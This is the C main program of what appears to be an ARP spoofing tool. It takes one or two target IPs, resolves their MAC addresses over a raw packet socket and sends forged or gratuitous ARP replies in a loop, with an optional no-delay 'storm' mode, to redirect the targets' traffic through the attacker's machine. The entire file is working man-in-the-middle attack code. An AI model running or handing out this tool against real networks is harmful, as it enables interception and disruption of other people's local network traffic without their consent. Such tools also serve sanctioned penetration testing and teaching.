#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <getopt.h>
#include <signal.h>

#include "arp.h"
#include "netutil.h"
#include "parse.h"
#include "log.h"
#include "util.h"

#define DELAY_MIN 100
#define DELAY_MAX 500 

volatile sig_atomic_t is_stopping = 0;

static const char * optstring = "hdgsa:b:t:i:m:M:T:";
static const struct option long_opts[] = {
	{"help", no_argument, 0, 'h'},
	{"target-a", required_argument, 0, 'a'},
	{"target-b", required_argument, 0, 'b'},
	{"dual-target", no_argument, 0, 'd'},
	{"target", required_argument, 0, 't'},
	{"gratuitous", no_argument, 0, 'g'},
	{"interface", required_argument, 0, 'i'},
	{"rand-min", required_argument, 0, 'm'},
	{"rand-max", required_argument, 0, 'M'},
	{"storm", no_argument, 0, 's'},
	{"timer", required_argument, 0, 'T'},
	{0, 0, 0, 0}
};

int main(int argc, char * argv[]) {	
	bool is_dual_target = 0;
	bool is_gratuitous = 0;
	bool is_arp_storm = 0;	

	uint8_t src_mac[6];
	uint8_t dst_mac_a[6];
	uint8_t dst_mac_b[6];
	uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

	char * interface = 0;

	int opt = 0;
	int fd = 0;	
	int rand_min = DELAY_MIN;
	int rand_max = DELAY_MAX;
	int timeout = -1;

	arp_ctx_t arp_ctx_a = {0};
	arp_ctx_t arp_ctx_b = {0};
	cleanup_data_t cleanup_data;	

	for (;;) {
		opt = getopt_long(argc, argv, optstring, long_opts, &opt);
		
		if(opt == '?') {
			print_usage();
			exit(1);
		}		
		if(opt == -1)
			break;
		
		switch(opt) {
			case 'h':
				print_help();
				exit(0);
			case 'a':
				arp_ctx_a.dst_ip = optarg;
				break;
			case 'b':
				arp_ctx_b.dst_ip = optarg;
				break;
			case 'd':
				is_dual_target = 1;
				break;
			case 't':			
				arp_ctx_a.dst_ip = optarg;
				break; 
			case 'g':
				is_gratuitous = 1;
				break;
			case 'i':
				interface = optarg;
				break;
			case 'm':
				rand_min = atoi(optarg);
				break;
			case 'M':
				rand_max = atoi(optarg);
				break;
			case 's':
				is_arp_storm = 1;
				break;
			case 'T':
				timeout = atoi(optarg);
				break;
			default:
				break;
		}
	}
	
	if(argc < 5) {
		print_usage();
		exit(1);
	}

	if(check_targets_ip(arp_ctx_a.dst_ip, arp_ctx_b.dst_ip, is_dual_target))
		exit(1);
	
	if(is_reserved_ip(arp_ctx_a.dst_ip) || is_reserved_ip(arp_ctx_b.dst_ip))
		exit(1);
	
	if(check_rand_ranges(rand_min, rand_max))
		exit(1);
	
	if(check_capabilities() == 0) {
		fprintf(stderr, "[!] No cap_net_raw capability, run it as root or set it\n");
		exit(1);
	}

	if(check_interface(interface))
		exit(1);
	
	fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	if(fd < 0) {
		fprintf(stderr, "[X] Error: Unable to create socket: %s\n", strerror(errno));
		exit(1);
	}
	
	if(get_local_mac(fd, interface, src_mac) != 0) {
		fprintf(stderr, "[!] Can not fetch device mac address\n");
		exit(1);
	}
	

	if(is_dual_target) {
		int resolve_a = 0;
		int resolve_b = 0;
		
		arp_ctx_a.src_mac = src_mac;
		arp_ctx_a.dst_mac = dst_mac_b;
		arp_ctx_b.dst_mac = dst_mac_a;
		arp_ctx_b.src_mac = src_mac;

		resolve_a = arp_resolve(fd, interface, arp_ctx_a);
		resolve_b = arp_resolve(fd, interface, arp_ctx_b);

		if(resolve_a != 0)
			fprintf(stderr, "[!] Unable to resolve target %s\n", arp_ctx_a.dst_ip);
		if(resolve_b != 0)
			fprintf(stderr, "[!] Unable to resolve target %s\n", arp_ctx_b.dst_ip);
		
		if(resolve_a != 0 || resolve_b != 0) {
			fprintf(stderr, "[!] One or more targets not resolved\n");
			exit(1);
		}
	}
	else {
		arp_ctx_a.src_mac = src_mac;
		arp_ctx_a.dst_mac = dst_mac_a;	
		int resolve = arp_resolve(fd, interface, arp_ctx_a);

		if(resolve != 0){
			fprintf(stderr, "[!] Unable to resolve target %s\n", arp_ctx_a.dst_ip);
			fprintf(stderr, "[!] Target not resolved\n");
			exit(1);
		}
	}
	
	cleanup_data.interface = interface;
	cleanup_data.ip_a = arp_ctx_a.dst_ip;
	cleanup_data.ip_b = arp_ctx_b.dst_ip;
	cleanup_data.mac_dst_a = dst_mac_b;
	cleanup_data.mac_dst_b = dst_mac_a;
	
	if(is_dual_target) {
		if(is_gratuitous) {
			arp_ctx_a.src_ip = arp_ctx_a.dst_ip;
			arp_ctx_a.dst_mac = broadcast_mac;
			arp_ctx_b.dst_mac = broadcast_mac;
			arp_ctx_b.src_ip = arp_ctx_b.dst_ip;
		}
		else {
			arp_ctx_a.dst_mac = dst_mac_b;
			arp_ctx_a.src_ip = arp_ctx_b.dst_ip;
			arp_ctx_b.dst_mac = dst_mac_a;
			arp_ctx_b.src_ip = arp_ctx_a.dst_ip;
		}
	}
	else {
		arp_ctx_a.src_ip = arp_ctx_a.dst_ip;
		arp_ctx_a.dst_mac = broadcast_mac;
	}

	setup_signals();

	srandom((unsigned int)time(NULL));
	
	if(timeout == 0) {
		fprintf(stderr, "[!] Timeout is invalid");
		exit(1);
	}

	if(timeout > 0) 
		alarm(timeout);

	for(;;) {
		if(is_stopping){
			do_cleanup(cleanup_data);
		}
		else {

		uint16_t delay_ms = rand_min + (uint16_t) random() % (rand_max - rand_min);
		int reply_a = 0, reply_b = 0;
		
	
		reply_a = arp_reply(fd, interface, arp_ctx_a);
		log_reply(arp_ctx_a);

		if(is_dual_target) {
			reply_b = arp_reply(fd, interface, arp_ctx_b);
			log_reply(arp_ctx_b);
		}	
		
		if(reply_a != 0 || reply_b != 0) {
			fprintf(stderr, "ARP send falled, exiting without cleanup!\n");
			exit(1);
		}	

		if(!is_arp_storm)
			usleep(delay_ms * 1000);
	}
	}
	return 0;
}
